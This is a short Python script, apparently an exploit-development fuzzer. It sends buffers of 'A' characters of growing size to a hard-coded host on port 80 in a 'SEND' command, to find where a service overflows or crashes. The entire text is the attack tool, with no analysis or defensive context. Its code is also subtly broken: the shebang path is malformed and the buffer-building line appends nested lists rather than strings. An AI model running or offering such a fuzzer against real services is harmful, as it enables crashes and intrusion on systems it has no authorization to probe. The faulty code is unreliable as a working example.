#!usr/bin/python

import socket

lista = ['A']
contador = 100

while len(lista) <= 50:
    lista.append(lista*contador)
    contador = contador + 100


for dados in lista:
    print('Enviando %s bytes' % len(dados))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.1', 80))
    s.recv(1024)
    s.send('SEND "%s"\r\n' % dados)
